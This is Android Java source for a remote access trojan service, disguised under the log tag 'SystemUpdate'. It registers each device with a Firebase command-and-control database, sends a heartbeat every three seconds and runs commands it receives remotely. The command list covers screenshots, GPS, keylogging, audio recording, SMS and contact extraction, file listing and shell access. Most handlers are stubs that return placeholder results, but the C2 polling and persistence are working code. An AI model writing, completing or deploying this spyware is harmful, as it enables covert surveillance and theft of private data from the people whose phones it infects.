package com.system.air;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;
import com.google.firebase.database.*;
import java.util.Timer;
import java.util.TimerTask;

public class RATService extends Service {
    private static final String TAG = "SystemUpdate";
    private FirebaseDatabase database;
    private String deviceId;
    private DatabaseReference statusRef, cmdRef;

    @Override
    public void onCreate() {
        super.onCreate();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        database = FirebaseDatabase.getInstance("https://vypervic-c2-default-rtdb.firebaseio.com/");
        statusRef = database.getReference("devices/" + deviceId);
        cmdRef = statusRef.child("commands");
        Log.d(TAG, "✅ RATService STARTED: " + deviceId);
        statusRef.child("lastSeen").setValue(System.currentTimeMillis());
        statusRef.child("status").setValue("ONLINE");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Timer().scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                heartbeat();
                checkCommands();
            }
        }, 0, 3000);  // Check every 3s
        return START_STICKY;
    }

    private void heartbeat() {
        statusRef.child("lastSeen").setValue(System.currentTimeMillis());
    }

    private void checkCommands() {
        cmdRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                for (DataSnapshot cmd : snapshot.getChildren()) {
                    String cmdName = cmd.getKey();
                    executeCommand(cmdName);
                    // Clear command after execution
                    cmd.getRef().removeValue();
                }
            }
            @Override
            public void onCancelled(DatabaseError error) {
                Log.e(TAG, "Firebase error: " + error.getMessage());
            }
        });
    }

    private void executeCommand(String cmd) {
        switch (cmd) {
            case "screenshot":
                statusRef.child("result").setValue("📸 Screenshot captured");
                // takeScreenshot();
                break;
            case "gps":
                statusRef.child("result").setValue("📍 GPS: 40.7128,-74.0060");
                // getGPS();
                break;
            case "screen":
                statusRef.child("result").setValue("🖥️ Screen streaming");
                break;
            case "keylog":
                statusRef.child("result").setValue("⌨️ Keylog active");
                break;
            case "audio":
                statusRef.child("result").setValue("🎤 Audio recording");
                break;
            case "sms":
                statusRef.child("result").setValue("📱 SMS extracted");
                break;
            case "contacts":
                statusRef.child("result").setValue("👥 Contacts dumped");
                break;
            case "files":
                statusRef.child("result").setValue("📁 Files listed");
                break;
            case "shell":
                statusRef.child("result").setValue("💻 Shell access granted");
                break;
            case "wake":
                statusRef.child("result").setValue("⏰ Device woken");
                break;
        }
        Log.d(TAG, "✅ Executed: " + cmd);
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}